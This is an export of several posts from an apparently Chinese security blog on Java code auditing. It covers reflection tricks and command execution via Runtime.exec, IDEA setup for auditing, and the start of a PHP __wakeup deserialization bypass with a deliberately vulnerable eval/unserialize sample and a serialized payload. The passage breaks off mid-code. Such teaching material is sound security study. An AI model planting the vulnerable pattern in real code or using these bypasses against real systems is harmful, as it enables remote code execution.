<span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span></span><br><span class="hljs-function">            ClassNotFoundException,NoSuchMethodException,</span><br><span class="hljs-function">            java.lang.IllegalAccessException, java.lang.reflect.InvocationTargetException,</span><br><span class="hljs-function">            java.lang.NoSuchFieldException</span>&#123;<br><br>        Class userClass = ClassLoader.getSystemClassLoader().loadClass(<span class="hljs-string">&quot;com.exampl.demo.entity.User&quot;</span>);<br>        System.out.println(userClass.getName());<br><br>        User admin = <span class="hljs-keyword">new</span> User(<span class="hljs-string">&quot;admin&quot;</span>);<br><br>        <span class="hljs-comment">// 反射获取secret属性</span><br>        Field userSecret = userClass.getDeclaredField(<span class="hljs-string">&quot;secret&quot;</span>);<br><br>        <span class="hljs-comment">// 反射获取secret的Modifiers</span><br>        Field secretModifiers = userSecret.getClass().getDeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>);<br>        secretModifiers.setAccessible(<span class="hljs-keyword">true</span>);<br><br>        <span class="hljs-comment">// 删除对应的PRIVATE属性</span><br>        secretModifiers.setInt(userSecret, userSecret.getModifiers() &amp; ~Modifier.PRIVATE);<br><br>        <span class="hljs-comment">// 注意此时userSecret没有setAccessible</span><br>        <span class="hljs-comment">// 成功修改属性</span><br>        userSecret.set(admin, <span class="hljs-string">&quot;cipher_new&quot;</span>);<br>        System.out.println(admin.getSecret());<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="获取构造器">3.2.5、获取构造器</h3><p>反射实现实例的构造，Java提供两种方法。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0033/image-20240229203926563.png" alt="image-20240229203926563" /></p><p>通过Construct属性，我们可获取对象的Construct方法。针对不同的构造器，我们通过反射时指定不同的参数获取相应的构造器。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exampl.demo.entity;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo3</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span></span><br><span class="hljs-function">            ClassNotFoundException,NoSuchMethodException,</span><br><span class="hljs-function">            java.lang.IllegalAccessException, java.lang.reflect.InvocationTargetException,</span><br><span class="hljs-function">            java.lang.NoSuchFieldException, java.lang.InstantiationException</span>&#123;<br><br>        Class userClass = ClassLoader.getSystemClassLoader().loadClass(<span class="hljs-string">&quot;com.exampl.demo.entity.User&quot;</span>);<br>        System.out.println(userClass.getName());<br><br>        <span class="hljs-comment">// 获取有参构造器</span><br>        Constructor con = userClass.getDeclaredConstructor(String.class);<br>        User user = (User)(con.newInstance(<span class="hljs-string">&quot;user&quot;</span>));<br>        System.out.println(user.getName());<br><br>        <span class="hljs-comment">// 获取无参构造器</span><br>        Constructor con1 = userClass.getDeclaredConstructor(<span class="hljs-keyword">null</span>);<br>        Object user1 = con1.newInstance();<br>        Method userGetName = userClass.getMethod(<span class="hljs-string">&quot;getName&quot;</span>);<br>        System.out.println(userGetName.invoke(user1));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="不安全的反射">3.3、不安全的反射</h2><h3 id="命令执行">3.3.1、命令执行</h3><p>基于反射机制，我们能够成功实现命令执行，而不需要显式地导入相应的类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exampl.demo.entity;<br><br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DemoExec</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException, IOException </span>&#123;<br>        Class execClass = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br><br>        <span class="hljs-comment">// 构造实例</span><br>        Constructor declaredConstructor = execClass.getDeclaredConstructor(<span class="hljs-keyword">null</span>);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        java.lang.Runtime runner =  (java.lang.Runtime) declaredConstructor.newInstance();<br><br>        <span class="hljs-comment">// 命令执行方法</span><br>        Method exec = execClass.getDeclaredMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        Process p = (Process)exec.invoke(runner, <span class="hljs-string">&quot;whoami&quot;</span>);<br><br>        <span class="hljs-comment">// 输出结果</span><br>        BufferedReader bufReader = <span class="hljs-keyword">new</span> BufferedReader(<span class="hljs-keyword">new</span> InputStreamReader(p.getInputStream()));<br>        String line = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">while</span>((line = bufReader.readLine()) != <span class="hljs-keyword">null</span>)<br>        &#123;<br>            System.out.println(line);<br>        &#125;<br>        bufReader.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过分析一下两个函数test1和test2之间的对应关系，能更好地理解Java反射。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test1</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>    Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test2</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException </span>&#123;<br>    Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(<br>        Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(<br>            <span class="hljs-keyword">null</span>),<span class="hljs-string">&quot;calc&quot;</span><br>    );<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="代理模式">4、代理模式</h1><p>代理模式提供了对目标对象额外的访问方式，即通过代理对象访问目标对象，这样可以在不修改原目标对象的前提下，<strong>提供额外的功能操作</strong>，<strong>扩展目标对象的功能</strong>。简言之，代理模式就是设置一个<strong>中间代理</strong>来控制访问原目标对象，以达到增强原对象的功能和简化访问方式。但是对于真正的调用来说, 实际上并不关心这个代理对象, 只要能够实现相应的业务逻辑就好。</p><h2 id="静态代理">4.1、静态代理</h2><h2 id="动态代理">4.2、动态代理</h2><h1 id="反序列化">5、反序列化</h1>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>Code Audit</tag>
      
      <tag>notes</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java代码审计 IDEA环境配置</title>
    <link href="/2023/09/03/blog0031-0-IDEA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <url>/2023/09/03/blog0031-0-IDEA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p>接下来将会更新一系列关于Java代码审计的内容，希望能够坚持下去吧。</p><p>第一篇章是IDEA的基础配置。希望下次不要再翻各种博客找到能用的配置文章吧。</p><p>这里使用的IDEA版本是2022.1的版本</p><span id="more"></span><h2 id="java-se项目配置">Java SE项目配置</h2><p>Java SE的IDEA创建相对较为简单，点击创建项目</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0031/image-20230903192123582.png" alt="image-20230903192123582" /></p><p>在新建的项目中，src -&gt; new Java Class，可以创建Java类对象，完成编程操作。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0031/image-20230903192718492.png" alt="image-20230903192718492" /></p><h2 id="java-web配置tomcat">Java Web配置Tomcat</h2><p>假设此时你已经有了一个Java Web应用程序的源代码，如何在本地配置Tomcat运行这个程序。</p><h3 id="配置项目属性">1、配置项目属性</h3><p>点击 <code>File</code> -&gt; <code>Project structure</code></p><p>选择<code>Project</code>配置JDK的版本</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0031/image-20230904155714764.png" alt="image-20230904155714764" /></p><p>选择<code>Modules</code>，指定运行的模板</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0031/image-20230904160038598.png" alt="image-20230904160038598" /></p><p>选择<code>Libraries</code>可以选择导入的库，当然更好的形式是使用maven来部署</p><p>选择<code>Artifacts</code>，指定部署模式，这里使用war包的形式</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0031/image-20230904160153646.png" alt="image-20230904160153646" /></p><h3 id="配置tomcat">2、配置Tomcat</h3><p>单击右上角<code>Add configuration</code></p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0031/image-20230904160512657.png" alt="image-20230904160512657" /></p><p>点击<code>+</code>号后选择tomcat完成项目部署</p><p>注意配置deployment、port等相关信息</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0031/image-20230904160620246.png" alt="image-20230904160620246" /></p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0031/image-20230904160956617.png" alt="image-20230904160956617" /></p><h2 id="java-web项目创建">Java Web项目创建</h2><p>上一步骤主要描述如何运行现成的Java Web应用程序，这一步骤将描述如何创建一个Java Web应用程序。</p><p>打开IDEA，选择JavaEE，模板选择Web application，完成其他参数的配置。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0031/image-20231023170429951.png" alt="image-20231023170429951" /></p><p>配置相应的库</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0031/image-20231023170541475.png" alt="image-20231023170541475" /></p><p>由此创建了Java Web的项目</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0031/image-20231023170642392.png" alt="image-20231023170642392" /></p><h2 id="spring项目创建">Spring项目创建</h2><p>Java的Spring配置相对比较繁琐，这也是为什么后面基本都迁移到了SpringBoot了。</p><h2 id="springboot创建">SpringBoot创建</h2><p>创建Java EE项目时选择Spring Initializr框架，就没有额外的工作了。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0031/image-20230904162243806.png" alt="image-20230904162243806" /></p><h2 id="maven相关">Maven相关</h2><h3 id="普通项目导入maven">1、普通项目导入maven</h3><p>右键单击我的项目，选择<code>Add Framework Support</code>，添加Maven</p><p><a href="https://blog.csdn.net/IT_model/article/details/88815258">普通项目导入Maven</a></p><h3 id="maven仓库配置">2、maven仓库配置</h3><p>选择<code>File</code> -&gt; <code>settings</code> -&gt; <code>Build</code> -&gt; <code>maven</code>，配置本地的maven仓库</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0031/image-20230904162751524.png" alt="image-20230904162751524" /></p><h3 id="maven配置本地仓库镜像源">3、maven配置本地仓库/镜像源</h3><p>在maven安装目录下的<code>conf/settings.xml</code>，配置一些参数</p><p>配置本次包存储位置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">localRepository</span>&gt;</span>D:\MySoftware\apache-maven-3.9.2\repository<span class="hljs-tag">&lt;/<span class="hljs-name">localRepository</span>&gt;</span><br></code></pre></td></tr></table></figure><p>创建maven项目常常会遇到速度很慢的情况，因此需要替换一下maven源。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">mirror</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>alimaven<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>aliyun maven<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span><br>    http://maven.aliyun.com/nexus/content/groups/public/<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">mirrorOf</span>&gt;</span>central<span class="hljs-tag">&lt;/<span class="hljs-name">mirrorOf</span>&gt;</span>        <br><span class="hljs-tag">&lt;/<span class="hljs-name">mirror</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0033/image-20230906112338376.png" alt="image-20230906112338376" /></p><h2 id="idea快捷键列表">IDEA快捷键列表</h2><table><thead><tr class="header"><th>动作</th><th>快捷键</th><th>说明</th></tr></thead><tbody><tr class="odd"><td>Move Caret to Code Block End</td><td>Ctrl+]</td><td>诸如{}围起来的代码块，使用该快捷键可以快速跳转至代码块的结尾处</td></tr><tr class="even"><td>Move Caret to Code Block Start</td><td>Ctrl+[</td><td>同上，快速跳至代码块的开始出</td></tr><tr class="odd"><td>Complete Current Statement</td><td><strong>Ctrl+Shift+Enter</strong></td><td>将输入的if、for、函数等等补上{}或者;使代码语句完整</td></tr><tr class="even"><td>Start New Line</td><td><strong>Shift+Enter</strong></td><td>在当前行的下方开始新行</td></tr><tr class="odd"><td>Start New Line Before Current</td><td><strong>Ctrl+Alt+Enter</strong></td><td>在当前行上方插入新行</td></tr><tr class="even"><td>Delete to Word End</td><td><strong>Ctrl+Delete</strong></td><td>删除光标所在至单词结尾处的所有字符</td></tr><tr class="odd"><td>Delete to Word Start</td><td>Ctrl+BackSpace</td><td>删除光标所在至单词开头的所有字符</td></tr><tr class="even"><td>Move Caret to Previous Word</td><td>Ctrl+向左箭头</td><td>将光标移至前一个单词</td></tr><tr class="odd"><td>Move Caret to Next Word</td><td>Ctrl+向右箭头</td><td>将光标移至后一个单词</td></tr><tr class="even"><td>Scroll Up</td><td>Ctrl+向上箭头</td><td>向上滚动一行</td></tr><tr class="odd"><td>Scroll Down</td><td>Ctrl+向下箭头</td><td>向下滚动一行</td></tr><tr class="even"><td>Extend Selection</td><td><strong>Ctrl+W</strong></td><td>选中整个单词</td></tr><tr class="odd"><td>Toggle Case</td><td>Ctrl+Shift+U</td><td>切换大小写</td></tr><tr class="even"><td>Undo</td><td><strong>Ctrl+Z</strong></td><td>撤销</td></tr><tr class="odd"><td>Redo</td><td>Ctrl+Shift+Z</td><td>重做</td></tr><tr class="even"><td>Cut</td><td><strong>Ctrl+X</strong></td><td>剪切</td></tr><tr class="odd"><td>Copy</td><td><strong>Ctrl+C</strong></td><td>复制</td></tr><tr class="even"><td>Paste</td><td><strong>Ctrl+V</strong></td><td>粘贴</td></tr><tr class="odd"><td>Join Lines</td><td>Ctrl+Shift+J</td><td>将选中的行合并成一行</td></tr><tr class="even"><td>Find</td><td><strong>Ctrl+F</strong></td><td>在当前文件中查找</td></tr><tr class="odd"><td>Replace</td><td><strong>Ctrl+R</strong></td><td>替换字符串</td></tr><tr class="even"><td>Find in Path</td><td><strong>Ctrl+Shift+F</strong></td><td>在全局文件中查找字符串</td></tr><tr class="odd"><td>Replace in Path</td><td><strong>Ctrl+Shift+R</strong></td><td>在全局中替换字符串</td></tr><tr class="even"><td>Find Usages</td><td>Alt+F7</td><td>查找当前变量的使用，并列表显示</td></tr><tr class="odd"><td>Show Usages</td><td>Ctrl+Alt+F7</td><td>查找当前变量的使用，并直接对话框显示</td></tr><tr class="even"><td>Find Usages in File</td><td>Ctrl+F7</td><td>在文件中查找符号的使用</td></tr><tr class="odd"><td>Highlight Usages in File</td><td>Ctrl+Shift+F7</td><td>在文件中高亮显示变量的使用</td></tr><tr class="even"><td>Class…</td><td><strong>Ctrl+N</strong></td><td>查找类文件</td></tr><tr class="odd"><td>File…</td><td><strong>Ctrl+Shift+N</strong></td><td>查找文件</td></tr><tr class="even"><td>Line…</td><td><strong>Ctrl+G</strong></td><td>定位到文件某一行</td></tr><tr class="odd"><td>Back</td><td>Alt+向左箭头</td><td>返回至上次光标位置</td></tr><tr class="even"><td>Forward</td><td>Alt+向右箭头</td><td>返回至后一次光标位置</td></tr><tr class="odd"><td>Last Edit Location</td><td>Ctrl+Shift+Backspace</td><td>返回上次编辑位置</td></tr><tr class="even"><td>Next Edit Location</td><td>Ctrl+Shift+反斜杠</td><td>返回后一次编辑位置</td></tr><tr class="odd"><td>Declaration</td><td>Ctrl+B</td><td>定位至变量定义的位置</td></tr><tr class="even"><td>Implementation(s)</td><td>Ctrl+Alt+B</td><td>定位至选中类或方法的具体实现</td></tr><tr class="odd"><td>Type Declaration</td><td>Ctrl+Shift+B</td><td>直接定位至光标所在变量的类型定义</td></tr><tr class="even"><td>Super Method</td><td>Ctrl+U</td><td>直接定位至当前方法override或者implements的方法定义处</td></tr><tr class="odd"><td>File Structure</td><td>Ctrl+F12</td><td>显示当前文件的文件结构</td></tr><tr class="even"><td>File Path</td><td>Ctrl+Alt+F12</td><td>显示当前文件的路径，并可以方便的将相关父路径打开</td></tr><tr class="odd"><td>Type Hierarchy</td><td>Ctrl+H</td><td>显示当前类的继承层次</td></tr><tr class="even"><td>Method Hierarchy</td><td>Ctrl+Shift+H</td><td>显示当前方法的继承层次</td></tr><tr class="odd"><td>Call Hierarchy</td><td>Ctrl+Alt+H</td><td>显示当前方法的调用层次</td></tr><tr class="even"><td>Next Highlighted Error</td><td>F2</td><td>定位至下一个错误处</td></tr><tr class="odd"><td>Previous Highlighted Error</td><td>Shift+F2</td><td>定位至前一个错误处</td></tr><tr class="even"><td>Previous Occurrence</td><td>Ctrl+Alt+向上箭头</td><td>查找前一个变量共现的地方</td></tr><tr class="odd"><td>Next Occurrence</td><td>Ctrl+Alt+向下箭头</td><td>查找下一个变量共现的地方</td></tr><tr class="even"><td>Override Methods…</td><td>Ctrl+O</td><td>重写基类的方法</td></tr><tr class="odd"><td>Implement Methods…</td><td>Ctrl+I</td><td>实现基类或接口中的方法</td></tr><tr class="even"><td>Generate…</td><td>Alt+Insert</td><td>产生构造方法、getter/setter等方法</td></tr><tr class="odd"><td>Surround With…</td><td>Ctrl+Alt+T</td><td>将选中的代码使用if、while、try/catch等包装</td></tr><tr class="even"><td>Unwrap/Remove…</td><td>Ctrl+Shift+Delete</td><td>去除相关的包装代码</td></tr><tr class="odd"><td>Basic</td><td>Alt+/</td><td>自动完成</td></tr><tr class="even"><td>SmartType</td><td>Alt+Enter</td><td>自动提示完成</td></tr><tr class="odd"><td>Expand</td><td>Ctrl+=</td><td>展开代码</td></tr><tr class="even"><td>Collapse</td><td>Ctrl+-</td><td>收缩代码</td></tr><tr class="odd"><td>Expand Recursively</td><td>Ctrl+Alt+=</td><td>递归展开代码</td></tr><tr class="even"><td>Collapse Recursively</td><td>Ctrl+Alt+-</td><td>递归收缩代码</td></tr><tr class="odd"><td>Expand All</td><td>Ctrl+Shift+=</td><td>展开所有代码</td></tr><tr class="even"><td>Collapse All</td><td>Ctrl+Shift+-</td><td>收缩所有代码</td></tr><tr class="odd"><td>Insert Live Template</td><td>Ctrl+J</td><td>插入Live Template</td></tr><tr class="even"><td>Surround with Live Template</td><td>Ctrl+Alt+J</td><td>使用Live Template包装</td></tr><tr class="odd"><td>Comment with Line Comment</td><td><strong>Ctrl+/</strong></td><td>使用//进行注释</td></tr><tr class="even"><td>Comment with Block Comment</td><td><strong>Ctrl+Shift+/</strong></td><td>使用/**/进行注释</td></tr><tr class="odd"><td>Reformat Code</td><td><strong>Ctrl+Alt+L</strong></td><td>格式化代码</td></tr><tr class="even"><td>Auto-Indent Lines</td><td>Ctrl+Alt+I</td><td>自动缩进行</td></tr><tr class="odd"><td>Optimize Imports</td><td>Ctrl+Alt+O</td><td>优化import</td></tr><tr class="even"><td>Move Statement Down</td><td>Ctrl+Shift+向下箭头</td><td>将光标所在的代码块向下整体移动</td></tr><tr class="odd"><td>Move Statement Up</td><td>Ctrl+Shift+向上箭头</td><td>将光标所在的代码块向上移动</td></tr><tr class="even"><td>Move Element Left</td><td>Ctrl+Alt+Shift+向左箭头</td><td>将元素向左移动</td></tr><tr class="odd"><td>Move Element Right</td><td>Ctrl+Alt+Shift+向右箭头</td><td>将元素向右移动</td></tr><tr class="even"><td>Move Line Down</td><td>Alt+Shift+向下箭头</td><td>将行向下移动</td></tr><tr class="odd"><td>Move Line Up</td><td>Alt+Shift+向上箭头</td><td>将行向上移动</td></tr><tr class="even"><td>Rename</td><td>Shift+F6</td><td>重命名</td></tr><tr class="odd"><td>Change Signature</td><td>Ctrl+F6</td><td>更改函数签名</td></tr><tr class="even"><td>Type Migration</td><td>Ctrl+Shift+F6</td><td>更改类型</td></tr></tbody></table><h2 id="idea调试本地jar包">IDEA调试本地Jar包</h2><p>CTF选手会遇到的一个需求，就是题目方给你一个Jar包/war包，如何在IDEA本地调试。</p><p>这里推荐一篇写得非常详细的文章：<a href="https://forum.butian.net/share/1753">Java审计调试</a></p><h2 id="jar包patch">Jar包patch</h2><p>推荐一个仓库：https://github.com/Jlan45/AWDJavaWebPatch</p><ol type="1"><li>使用这个仓库生成相应的IDEA环境，然后修改对应的Java包</li><li>将生成的class文件替换进去（建议不要解压再打包，直接替换）</li></ol><h2 id="调试jdk源码">调试JDK源码</h2><p>我们下载的JDK中，一般含有SRC.zip</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0031/image-20240308210035823.png" alt="image-20240308210035823" /></p><p>但是SRC.zip中如sun包等是不存在源码的，在IDEA中只能以反编译形式存在，因此我们可以选择下载JDK版本对应的openJDK，将openJDK中的<code>src/share/classes/sun</code>文件夹拷贝到src.zip解压的文件夹中。</p><p>在IDEA中点击<code>project setting</code>，选择<code>source path</code>，直接添加对应的文件夹即可。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0031/dc08bc333c1e86e0a3b64c7e10d15fa.png" alt="dc08bc333c1e86e0a3b64c7e10d15fa" /></p><p>推荐一篇类似的博文，修改<a href="https://developer.aliyun.com/article/828627">openJDK源码</a></p><h2 id="other报错及解决">Other、报错及解决</h2><h3 id="错误的java发行版">错误的Java发行版</h3><p>具体信息：java: 错误: 无效的源发行版：17</p><p><a href="https://blog.csdn.net/weixin_44299027/article/details/120848738">JDK版本不一致</a></p><h3 id="类文件具有错误的版本-61.0-应为-52.0">类文件具有错误的版本 61.0, 应为 52.0</h3><p><a href="https://blog.csdn.net/simonchi/article/details/126625381">Spring6往上版本不支持低版本JDK</a></p><h3 id="idea中tomcat编码错误处理">IDEA中Tomcat编码错误处理</h3><p><a href="https://blog.csdn.net/mr_liuhailong/article/details/110264765">Tomcat中编码匹配问题处理</a></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>Code Audit</tag>
      
      <tag>notes</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php反序列化绕过 wakeup 总结</title>
    <link href="/2023/08/26/blog0032-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-wakeup%E6%80%BB%E7%BB%93/"/>
    <url>/2023/08/26/blog0032-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-wakeup%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>上次某个比赛看到PHP反序列化的__wakeup绕过，发现自己竟然只知道利用属性个数异常的来绕过一种方法。确实是比赛打得太少了，很多trick都不知道，特地找了些博客去分析了一下。</p><p>推荐博客：<a href="https://fushuling.com/index.php/2023/03/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADwakeup%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/">php wakeup绕过</a></p><h2 id="cve-2016-7124">1、CVE-2016-7124</h2><p>影响范围：</p><ul><li>PHP5 &lt; 5.6.25</li><li>PHP7 &lt; 7.0.10</li></ul><p>这个是我学习PHP反序列化绕过学习到的第一个姿势。</p><p>以下面这个简单的例子进行说明：</p><p>这个代码的实现非常简单，只要能够绕过wakeup就能实现任意的代码运行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>show_source(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">trick</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$code</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;code = <span class="hljs-variable">$code</span>;            <br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;code = <span class="hljs-string">&quot;echo hello;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><br>unserialize(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;trick&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>假如没有<code>__wakeup</code>，POST如下数值即可实现</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">trick</span>=O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;trick&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;code&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;phpinfo();&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>此时我们只需要修改php反序列类的属性个数，即可实现对wakeup的绕过</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code 